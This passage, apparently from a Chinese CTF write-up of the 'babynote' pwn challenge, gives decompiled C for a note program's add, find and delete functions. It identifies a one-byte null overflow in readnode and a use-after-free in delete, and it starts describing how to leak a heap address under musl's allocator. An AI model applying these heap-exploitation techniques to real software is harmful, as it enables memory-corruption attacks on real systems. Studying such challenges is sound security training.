class=&#34;number&#34;&gt;0x28&lt;/span&gt;uLL);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  ptr-&amp;gt;name_size = addname(&amp;amp;ptr-&amp;gt;name);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  ptr-&amp;gt;note_size = addnote(&amp;amp;ptr-&amp;gt;note);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  ptr-&amp;gt;next = (__int64)&lt;span class=&#34;built_in&#34;&gt;list&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;built_in&#34;&gt;list&lt;/span&gt; = (babynote **)ptr;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;built_in&#34;&gt;puts&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;ok&amp;quot;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;/*--------------------------------------------------------*/&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;__int64 __fastcall &lt;span class=&#34;title function_&#34;&gt;addname&lt;/span&gt;&lt;span class=&#34;params&#34;&gt;(__int64 *ptr)&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;type&#34;&gt;size_t&lt;/span&gt; size; &lt;span class=&#34;comment&#34;&gt;// [rsp+18h] [rbp-8h]&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;built_in&#34;&gt;printf&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;name size: &amp;quot;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  size = getnum();&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  *ptr = (__int64)&lt;span class=&#34;built_in&#34;&gt;calloc&lt;/span&gt;(&lt;span class=&#34;number&#34;&gt;1uLL&lt;/span&gt;, size);           &lt;span class=&#34;comment&#34;&gt;// calloc清空数据&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;built_in&#34;&gt;printf&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;name: &amp;quot;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt; (&lt;span class=&#34;type&#34;&gt;int&lt;/span&gt;)readnode(*ptr, size);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;type&#34;&gt;unsigned&lt;/span&gt; __int64 __fastcall &lt;span class=&#34;title function_&#34;&gt;readnode&lt;/span&gt;&lt;span class=&#34;params&#34;&gt;(__int64 a1, &lt;span class=&#34;type&#34;&gt;unsigned&lt;/span&gt; __int64 a2)&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;type&#34;&gt;char&lt;/span&gt; buf; &lt;span class=&#34;comment&#34;&gt;// [rsp+13h] [rbp-Dh] BYREF&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;type&#34;&gt;unsigned&lt;/span&gt; &lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; i; &lt;span class=&#34;comment&#34;&gt;// [rsp+14h] [rbp-Ch]&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;type&#34;&gt;unsigned&lt;/span&gt; __int64 v5; &lt;span class=&#34;comment&#34;&gt;// [rsp+18h] [rbp-8h]&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  v5 = __readfsqword(&lt;span class=&#34;number&#34;&gt;0x28&lt;/span&gt;u);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;keyword&#34;&gt;for&lt;/span&gt; ( i = &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;; a2 &amp;gt; (&lt;span class=&#34;type&#34;&gt;int&lt;/span&gt;)i; ++i )&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; ( read(&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;, &amp;amp;buf, &lt;span class=&#34;number&#34;&gt;1uLL&lt;/span&gt;) != &lt;span class=&#34;number&#34;&gt;1&lt;/span&gt; )&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      &lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt; i;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    *(_BYTE *)(a1 + (&lt;span class=&#34;type&#34;&gt;int&lt;/span&gt;)i) = buf;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; ( buf == &lt;span class=&#34;string&#34;&gt;&amp;#x27;\n&amp;#x27;&lt;/span&gt; )                          &lt;span class=&#34;comment&#34;&gt;// 一字节\x00溢出&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      *(_BYTE *)((&lt;span class=&#34;type&#34;&gt;int&lt;/span&gt;)i + a1) = &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      &lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt; i;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt; a2;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;/*--------------------------------------------------------*/&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;__int64 __fastcall &lt;span class=&#34;title function_&#34;&gt;addnote&lt;/span&gt;&lt;span class=&#34;params&#34;&gt;(&lt;span class=&#34;type&#34;&gt;void&lt;/span&gt; *a1)&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;type&#34;&gt;size_t&lt;/span&gt; size; &lt;span class=&#34;comment&#34;&gt;// [rsp+18h] [rbp-8h]&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;built_in&#34;&gt;printf&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;note size: &amp;quot;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  size = getnum();&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  *(_QWORD *)a1 = &lt;span class=&#34;built_in&#34;&gt;calloc&lt;/span&gt;(&lt;span class=&#34;number&#34;&gt;1uLL&lt;/span&gt;, size);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;built_in&#34;&gt;printf&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;note content: &amp;quot;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt; (&lt;span class=&#34;type&#34;&gt;int&lt;/span&gt;)readnode(*(_QWORD *)a1, size);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;add 添加时，ida 分析的结果并不准确，这里永远存在一字节的空溢出。&lt;/p&gt;
&lt;p&gt;后来根据网上查到的学习资料。由于 musl 的堆管理比较简单，这个空溢出可以用来修改 chunk 的 idx 位，伪造 meta。&lt;/p&gt;
&lt;p&gt;后面再说。&lt;/p&gt;
&lt;h3 id=&#34;find&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#find&#34;&gt;#&lt;/a&gt; find&lt;/h3&gt;
&lt;p&gt;find 会创建一个 name 的 chunk, 然后根据 size 以及 list 保留的 size,cmp，最后比较字符串。如果相同就返回第一个找到的符合要求的 babynote 指针。&lt;/p&gt;
&lt;figure class=&#34;highlight c&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;26&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;27&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;28&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;type&#34;&gt;unsigned&lt;/span&gt; __int64 &lt;span class=&#34;title function_&#34;&gt;find&lt;/span&gt;&lt;span class=&#34;params&#34;&gt;()&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;type&#34;&gt;void&lt;/span&gt; *ptr; &lt;span class=&#34;comment&#34;&gt;// [rsp+0h] [rbp-20h] BYREF&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;type&#34;&gt;size_t&lt;/span&gt; size; &lt;span class=&#34;comment&#34;&gt;// [rsp+8h] [rbp-18h]&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  babynote *v3; &lt;span class=&#34;comment&#34;&gt;// [rsp+10h] [rbp-10h]&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;type&#34;&gt;unsigned&lt;/span&gt; __int64 v4; &lt;span class=&#34;comment&#34;&gt;// [rsp+18h] [rbp-8h]&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  v4 = __readfsqword(&lt;span class=&#34;number&#34;&gt;0x28&lt;/span&gt;u);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  ptr = &lt;span class=&#34;number&#34;&gt;0LL&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  size = addname(&amp;amp;ptr);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  v3 = cmp(ptr, size);                          &lt;span class=&#34;comment&#34;&gt;// 确认数据&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; ( v3 )&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    info(v3-&amp;gt;note, v3-&amp;gt;note_size);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;keyword&#34;&gt;else&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;built_in&#34;&gt;puts&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;oops.....&amp;quot;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;built_in&#34;&gt;free&lt;/span&gt;(ptr);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt; __readfsqword(&lt;span class=&#34;number&#34;&gt;0x28&lt;/span&gt;u) ^ v4;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;//输出babynote的信息&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; __fastcall &lt;span class=&#34;title function_&#34;&gt;info&lt;/span&gt;&lt;span class=&#34;params&#34;&gt;(&lt;span class=&#34;type&#34;&gt;char&lt;/span&gt; *a1, &lt;span class=&#34;type&#34;&gt;unsigned&lt;/span&gt; __int64 a2)&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; i; &lt;span class=&#34;comment&#34;&gt;// [rsp+1Ch] [rbp-4h]&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;built_in&#34;&gt;printf&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;%#lx:&amp;quot;&lt;/span&gt;, a2);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;keyword&#34;&gt;for&lt;/span&gt; ( i = &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;; a2 &amp;gt; i; ++i )&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;built_in&#34;&gt;printf&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;%02x&amp;quot;&lt;/span&gt;, a1[i]);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;built_in&#34;&gt;puts&lt;/span&gt;(&amp;amp;s);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;输出的信息也会收到 size 的限制。当时我有看到一个点，就是 i 是有符号的，而 a2 无符号。但是貌似没有什么价值。最后 free 那个临时创建的 chunk.&lt;/p&gt;
&lt;h3 id=&#34;delete&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#delete&#34;&gt;#&lt;/a&gt; delete&lt;/h3&gt;
&lt;figure class=&#34;highlight c&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;26&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;27&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;28&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;29&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;30&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;31&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;32&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;33&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;34&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;35&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;36&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;37&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;38&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;39&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;40&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;type&#34;&gt;unsigned&lt;/span&gt; __int64 &lt;span class=&#34;title function_&#34;&gt;delete&lt;/span&gt;&lt;span class=&#34;params&#34;&gt;()&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  babynote *v1; &lt;span class=&#34;comment&#34;&gt;// [rsp+8h] [rbp-28h] BYREF&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  babynote **i; &lt;span class=&#34;comment&#34;&gt;// [rsp+10h] [rbp-20h]&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;type&#34;&gt;size_t&lt;/span&gt; size; &lt;span class=&#34;comment&#34;&gt;// [rsp+18h] [rbp-18h]&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  babynote *ptr; &lt;span class=&#34;comment&#34;&gt;// [rsp+20h] [rbp-10h]&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;type&#34;&gt;unsigned&lt;/span&gt; __int64 v5; &lt;span class=&#34;comment&#34;&gt;// [rsp+28h] [rbp-8h]&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  v5 = __readfsqword(&lt;span class=&#34;number&#34;&gt;0x28&lt;/span&gt;u);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  v1 = &lt;span class=&#34;number&#34;&gt;0LL&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  size = addname(&amp;amp;v1);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  ptr = cmp(v1, size);                          &lt;span class=&#34;comment&#34;&gt;// /删除某个特定的&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; ( ptr )&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; ( ptr != &lt;span class=&#34;built_in&#34;&gt;list&lt;/span&gt; || &lt;span class=&#34;built_in&#34;&gt;list&lt;/span&gt;-&amp;gt;next )&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; ( ptr-&amp;gt;next )&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;for&lt;/span&gt; ( i = &amp;amp;&lt;span class=&#34;built_in&#34;&gt;list&lt;/span&gt;; ptr != *i; i = &amp;amp;(*i)-&amp;gt;next )&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;          ;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        *i = ptr-&amp;gt;next;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      &amp;#125;                                         &lt;span class=&#34;comment&#34;&gt;// 解链表&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;else&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      &lt;span class=&#34;built_in&#34;&gt;list&lt;/span&gt; = &lt;span class=&#34;number&#34;&gt;0LL&lt;/span&gt;;                               &lt;span class=&#34;comment&#34;&gt;// 删除头指针，就清空了所有&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;built_in&#34;&gt;free&lt;/span&gt;(ptr-&amp;gt;name);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;built_in&#34;&gt;free&lt;/span&gt;(ptr-&amp;gt;note);                            &lt;span class=&#34;comment&#34;&gt;// 释放note&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;built_in&#34;&gt;free&lt;/span&gt;(ptr);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;built_in&#34;&gt;puts&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;ok&amp;quot;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;keyword&#34;&gt;else&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;built_in&#34;&gt;puts&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;oops.....&amp;quot;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;built_in&#34;&gt;free&lt;/span&gt;(v1);                                     &lt;span class=&#34;comment&#34;&gt;// 删除临时结构体&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt; __readfsqword(&lt;span class=&#34;number&#34;&gt;0x28&lt;/span&gt;u) ^ v5;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;删除 note 的时候，会遍历链表，找到对应的指针后，会 set 对应结构的 next 指针。p-&amp;gt;next = p-&amp;gt;next-&amp;gt;next. 但是如果 ptr 是尾指针，就不会进行 set. 存在 UAF&lt;/p&gt;
&lt;h2 id=&#34;利用&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#利用&#34;&gt;#&lt;/a&gt; 利用&lt;/h2&gt;
&lt;p&gt;delete 最后一个，只会 free 对应的堆块，但是倒数第二个 babynote 的 next 没有 reset, 所以就存在了 uaf. 但是 musl 的堆块释放后并不会进入 bins。只有 meta 的所有 avail_maks 都被释放后才会将 meta 释放，并把 meta 放入双链表，dequeue（所以 meta free 后是）&lt;/p&gt;
&lt;p&gt;程序的了漏洞在于 delete 时存在的 UAF, 如果我们将其释放后，并对其 note 进行 reuse, 而且用作 babbynote, 就会在 slot 上储存 3 个指针，导致 heapaddr 泄露。但是这里需要布置对的结构。&lt;/p&gt;
